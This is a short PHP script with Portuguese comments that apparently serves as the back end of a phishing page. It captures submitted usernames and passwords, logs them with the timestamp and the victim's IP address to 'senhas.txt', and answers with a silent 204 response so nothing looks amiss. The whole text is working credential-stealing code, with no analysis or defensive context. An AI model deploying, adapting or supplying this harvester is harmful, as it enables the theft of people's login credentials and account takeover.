<?php
// grava senhas em senhas.txt
if(!empty($_POST['u']) && !empty($_POST['p'])){
    $line = date("Y-m-d H:i:s")." -u: ".$_POST['u']." -p: ".$_POST['p']." IP: ".$_SERVER['REMOTE_ADDR']."\n";
    file_put_contents("senhas.txt",$line,FILE_APPEND);
}
http_response_code(204); //silencioso
